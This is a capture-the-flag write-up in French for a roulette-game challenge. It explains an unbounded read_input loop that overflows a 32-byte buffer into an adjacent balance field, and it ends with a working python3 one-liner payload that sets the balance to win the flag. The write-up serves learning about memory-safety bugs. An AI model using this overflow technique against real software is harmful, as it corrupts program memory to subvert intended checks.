# pwn - Jackpwn

L'objectif du challenge est d'avoir un solde de 0x1337 à la
fin d'un tour. Il n'est pas possible d'obtenir un tel solde de
manière légitime car 0x1337 (4919) est impair et le solde est
incrémenté ou décrémenté de 2 à chaque tour, en partant de 50.

## Vulnérabilité

La fonction `read_input` ne prend pas en compte la taille du
buffer passé en argument, il y a donc un buffer overflow.

```c
void read_input(char *buf) {
    char c;
    while (1) {
        c = getchar();
        if (c == '\n') {
            *(buf++) = 0;
            break;
        } else if (c == EOF) {
            exit(0);
        }
        *(buf++) = c;
    }
}
// [...]

int main() {
    // [...]
    read_input(ctx.mise);
    // [...]
```

La variable `ctx.mise` est concernée par ce buffer overflow et
est située juste avant le solde.

```c
struct {
    char mise[32];
    int solde;
} ctx;
```

Il faut donc envoyer plus de 32 caractères pour changer le
solde de manière arbitraire.

La mise doit être valide pour être acceptée. Elle doit
vérifier une des conditions suivantes :
```c
if (!strcmp(ctx.mise, "rouge")) {
    valide = rouge = 1;
} else if (!strcmp(ctx.mise, "noir")) {
    valide = noir = 1;
} else if (!strcmp(ctx.mise, "pair")) {
    valide = pair = 1;
} else if (!strcmp(ctx.mise, "impair")) {
    valide = impair = 1;
} else {
    puts("Mise invalide");
}
```

Le joueur peut donc envoyer "pair" suivi d'un null-byte et de
`32-4-1` caractères, puis la valeur 0x1337-2 en little-endian
pour valider le challenge.

Il faut gagner la manche pour avoir un solde égal à 0x1337 et
afficher le flag.

```sh
python3 -c 'import sys; sys.stdout.write("pair\x00" + "A"*(32-4-1) + "\x35\x13\x00\x00" + "\n")' | ./chall
```
